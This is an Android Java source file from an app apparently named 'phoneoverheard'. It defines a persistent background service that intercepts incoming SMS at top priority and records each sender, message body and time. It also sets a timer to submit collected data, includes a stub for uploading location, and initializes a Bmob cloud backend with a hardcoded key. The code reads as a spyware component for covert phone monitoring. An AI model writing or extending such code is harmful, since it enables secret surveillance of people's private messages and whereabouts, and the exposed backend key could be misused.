package com.phoneoverheard.phone;

import java.util.Date;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

import cn.bmob.v3.Bmob;

import com.phoneoverheard.interfaces.Constant;
import com.phoneoverheard.util.StringUtils;

public class BackService extends Service {

	private SMSReceiver receiver;
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub

		IntentFilter filter = new IntentFilter();
		filter.addAction(SMSReceiver.SMS_RECEIVED_ACTION);
		filter.addAction(Constant.INTENT_ACTION_TIMER_CHECK_TO_SUBMIT);
		filter.setPriority(Integer.MAX_VALUE);
		receiver = new SMSReceiver();
		registerReceiver(receiver, filter);

		// 开启定时检查
		AlarmReceiver.startRepeatAlarmer(this, Constant.ALARM_INTERVAL_HOUR_TO_CHECK_SUBMIT);
		
		Bmob.initialize(getApplicationContext(),"404e868375438ee2f3b5f0d2a37e4d14");

		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		return START_STICKY;
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub

		unregisterReceiver(receiver);
		super.onDestroy();
	}
	
	/** 
	 * 检查常态定位数据并上传
	 * @author liulei	
	 * @date 2015-9-16 void   
	*/
	public void checkLocNormal(){
		
		
	}

	public class SMSReceiver extends BroadcastReceiver {

		public static final String TAG = "ImiChatSMSReceiver";
		public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";

		@Override
		public void onReceive(Context context, Intent intent) {

			String action = intent.getAction();

			if (action.equals(SMS_RECEIVED_ACTION)) {

				SmsMessage msg = null;
				Object[] messages = (Object[]) intent.getSerializableExtra("pdus");

				for (Object object : messages) {
					msg = SmsMessage.createFromPdu((byte[]) object);

					Date date = new Date(msg.getTimestampMillis());// 时间
					String time = StringUtils.formatDate(date, StringUtils.DEFAULT_DATETIME_PATTERN);
					String content = msg.getDisplayMessageBody();
					String phone = msg.getOriginatingAddress();

					Log.i(TAG, "number:" + phone + "   body:" + content + "  time:" + time);

				}

				
			} else if (action.equals(Constant.INTENT_ACTION_TIMER_CHECK_TO_SUBMIT)) {

			}
		}
	}

}
